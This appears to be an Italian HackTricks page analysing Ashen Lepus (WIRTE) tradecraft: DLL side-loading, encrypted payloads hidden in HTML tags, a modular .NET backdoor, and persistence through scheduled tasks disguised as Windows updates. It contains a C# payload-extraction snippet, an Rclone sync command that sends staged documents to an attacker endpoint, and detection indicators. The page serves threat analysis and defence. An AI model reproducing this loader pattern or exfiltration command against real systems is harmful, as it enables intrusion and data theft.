# Avanzato DLL Side-Loading Con HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) ha sfruttato un pattern ripetibile che concatena DLL sideloading, staged HTML payloads e modular .NET backdoors per persistere all'interno di reti diplomatiche del Medio Oriente. La tecnica è riutilizzabile da qualsiasi operatore perché si basa su:

- **Archive-based social engineering**: PDF benigni istruiscono i bersagli a scaricare un archivio RAR da un sito di file-sharing. L'archivio include un EXE visualizzatore di documenti dall'aspetto reale, una DLL malevola nominata come una libreria di fiducia (es., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), e un `Document.pdf` esca.
- **DLL search order abuse**: la vittima fa doppio clic sull'EXE, Windows risolve l'import della DLL dalla directory corrente, e il loader malevolo (AshenLoader) viene eseguito all'interno del processo affidabile mentre il PDF esca si apre per evitare sospetti.
- **Living-off-the-land staging**: ogni stage successivo (AshenStager → AshenOrchestrator → modules) viene mantenuto off-disk fino al bisogno, consegnato come blob cifrati nascosti all'interno di risposte HTML altrimenti innocue.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: l'EXE side-loads AshenLoader, che esegue host recon, lo cifra con AES-CTR e lo invia via POST all'interno di parametri rotanti come `token=`, `id=`, `q=`, o `auth=` verso percorsi che simulano API (es., `/api/v2/account`).
2. **HTML extraction**: il C2 rivela il prossimo stage solo quando l'IP client geolocalizza nella regione target e il `User-Agent` corrisponde all'impianto, frustrando le sandbox. Quando i controlli passano il corpo HTTP contiene un blob `<headerp>...</headerp>` con il payload AshenStager cifrato Base64/AES-CTR.
3. **Second sideload**: AshenStager viene distribuito con un altro binario legittimo che importa `wtsapi32.dll`. La copia malevola iniettata nel binario recupera più HTML, stavolta estraendo `<article>...</article>` per recuperare AshenOrchestrator.
4. **AshenOrchestrator**: un controller modulare .NET che decodifica una config JSON in Base64. I campi `tg` e `au` della config vengono concatenati/hashed per creare la chiave AES, che decifra `xrk`. I byte risultanti fanno da chiave XOR per ogni blob di modulo recuperato successivamente.
5. **Module delivery**: ogni modulo è descritto tramite commenti HTML che reindirizzano il parser a un tag arbitrario, rompendo regole statiche che cercano solo `<headerp>` o `<article>`. I moduli includono persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) e file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Anche se i difensori bloccano o rimuovono un elemento specifico, l'operatore deve solo cambiare il tag indicato nel commento HTML per riprendere la consegna.

## Crypto e rafforzamento C2

- **AES-CTR everywhere**: gli attuali loaders incorporano chiavi a 256 bit più nonces (e.g., `{9a 20 51 98 ...}`) e opzionalmente aggiungono uno strato XOR usando stringhe come `msasn1.dll` prima/dopo la decifratura.
- **Recon smuggling**: i dati enumerati ora includono le liste di Program Files per individuare applicazioni ad alto valore e sono sempre cifrati prima di lasciare l'host.
- **URI churn**: i parametri di query e i percorsi REST ruotano tra le campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando rilevamenti fragili.
- **Gated delivery**: i server sono geo-fenced e rispondono solo a real implants. I client non approvati ricevono HTML non sospetto.

## Persistenza e ciclo di esecuzione

AshenStager crea scheduled tasks che si spacciano per job di manutenzione di Windows e vengono eseguiti tramite `svchost.exe`, p.es.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Queste attività rilanciano la catena di sideloading all'avvio o a intervalli, garantendo che AshenOrchestrator possa richiedere moduli freschi senza toccare nuovamente il disco.

## Uso di client di sincronizzazione benigni per l'esfiltrazione

Gli operatori posizionano documenti diplomatici in `C:\Users\Public` (leggibile da tutti e non sospetto) tramite un modulo dedicato, poi scaricano il legittimo binario [Rclone](https://rclone.org/) per sincronizzare quella directory con lo storage controllato dall'attaccante:

1. **Stage**: copiare/raccogliere i file target in `C:\Users\Public\{campaign}\`.
2. **Configure**: fornire un file di config Rclone che punti a un endpoint HTTPS controllato dall'attaccante (e.g., `api.technology-system[.]com`).
3. **Sync**: eseguire `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` così il traffico assomiglia a normali backup cloud.

Poiché Rclone è ampiamente usato per workflow di backup legittimi, i difensori devono concentrarsi su esecuzioni anomale (nuovi binari, remoti sospetti, o sincronizzazioni improvvise di `C:\Users\Public`).

## Indicatori per il rilevamento

- Segnalare processi **signed processes** che caricano inaspettatamente DLL da percorsi scrivibili dall'utente (filtri Procmon + `Get-ProcessMitigation -Module`), specialmente quando i nomi delle DLL coincidono con `netutils`, `srvcli`, `dwampi`, o `wtsapi32`.
- Ispezionare risposte HTTPS sospette per **grandi blob Base64 incorporati in tag insoliti** o protetti da commenti `<!-- TAG: <xyz> -->`.
- Cercare **scheduled tasks** che eseguono `svchost.exe` con argomenti non da servizio o che puntano a directory dei dropper.
- Monitorare la presenza di binari **Rclone** fuori dalle posizioni gestite dall'IT, nuovi file `rclone.conf`, o job di sincronizzazione che prelevano da directory di staging come `C:\Users\Public`.

## Riferimenti

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
